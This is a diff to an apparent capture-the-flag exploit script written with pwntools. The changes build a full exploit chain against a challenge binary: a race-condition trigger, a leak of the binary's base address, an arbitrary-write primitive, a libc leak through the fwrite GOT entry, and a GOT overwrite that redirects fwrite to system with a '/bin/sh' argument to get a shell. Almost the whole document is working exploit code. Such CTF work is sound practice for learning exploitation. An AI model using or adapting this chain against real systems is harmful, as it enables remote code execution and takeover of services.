@@ -34,6 +34,8 @@ event = threading.Event()
 PIPE_BUF = 0x1000
 ENDPOINT = "0"
 SERVICE_PORT = port
+
+
 # Raw intereraction with challenge frontend
 def send_message(message, author, sync: threading.Semaphore):
     try:
@@ -60,9 +62,10 @@ def send_stage(payload: dict):
         x.start()
 
     print("Waiting for data to be sent")
-    time.sleep(2)
+    time.sleep(5)
     print("Triggering race condition!")
     sync.release(30)
+
 ### Helper functions to create C structs defined in challenge code
 def build_message(message, author, next):
     return flat({
@@ -93,37 +96,53 @@ def command_redact(id, data):
     return build_command(0xcafebabe, id, data)
 
 def leak_text(r: pwnlib.tubes.tube.tube):
-    # payload = {
-    payload = command_print(),
-    # }
+    payload = {
+        offset: command_print(),
+    }
 
     send_stage(payload)
 
     while True:
-        null_element_address = 0
-        try:
-            null_element_address = int(r.recvline_contains(b"Next is ",timeout=1).strip().split(b"Next is ")[1], 0)
-        except:
-            pass
-            print(f"Leaked {hex(null_element_address)}")
+        null_element_address = int(r.recvline_contains(b"Next is ").strip().split(b"Next is ")[1], 0)
+        print(f"Leaked {hex(null_element_address)}")
 
-            test_address = null_element_address-exe.symbols["NUL"]
+        test_address = null_element_address-exe.symbols["NUL"]
 
-            # This is an hacky way to identify the correct address from the various leaks.
-            if test_address % 4096 == 0:
-                exe.address = test_address
-                break
-        # except:
-        #     continue
+        # This is an hacky way to identify the correct address from the various leaks.
+        if test_address % 4096 == 0:
+            exe.address = test_address
+            break
 
     print(f"Text base address = {hex(exe.address)}")
     sleep(1)
-leak_text(p2)
-# gdb.attach(p2.pid+1)
-# send_stage(command_print())
-# a = p2.recvuntil("Message",timeout=1)
-# print(f"debug: {a}")
-# p2.interactive()
-# if a !=b"":
-#     p2.interactive()
-#     input()
+
+# Payload to perform arbitrary write
+def write_payload(addr, data):
+    return command_flush() + build_message(b"CUT-HERE-FOR-WRITE", b"CUT-HERE-FOR-WRITE\0", addr-0x80+6*8) + command_redact(1, data)
+
+
+def leak_libc(r: pwnlib.tubes.tube.tube):
+    # Before printing, we are gonna write 0x0 right before the address to be leaked
+    # So that mex->next is NULL
+    payload = {
+        offset: write_payload(exe.got.fwrite-0x8, 0x0) + read_payload(exe.got.fwrite, b"CUT-HERE-FOR-LIBC-LEAK", b"CUT-HERE-FOR-LIBC-LEAK\0"),
+    }
+    send_stage(payload)
+
+    # Discard useless prints
+    r.recvline_contains(b"'CUT-HERE-FOR-LIBC-LEAK' by CUT-HERE-FOR-LIBC-LEAK. Next is ")
+
+    # Read leaked address
+    leaked_address = u64(r.recvline().strip().split(b"'' by ")[1].split(b".")[0]+b'\x00\x00')
+    print(f"libc.sym.fwrite = {hex(leaked_address)}")
+    libc.address = leaked_address - libc.sym.fwrite
+    print(f"Libc base address = {hex(libc.address)}")
+    sleep(1)
+
+def rewrite_got(r: pwnlib.tubes.tube.tube):
+    payload = {
+        offset: write_payload(exe.got.fwrite, libc.sym.system) + build_message(b"/bin/sh", b"Master pwner", 0x0),
+    }
+
+    send_stage(payload)
+leak_libc(p2)
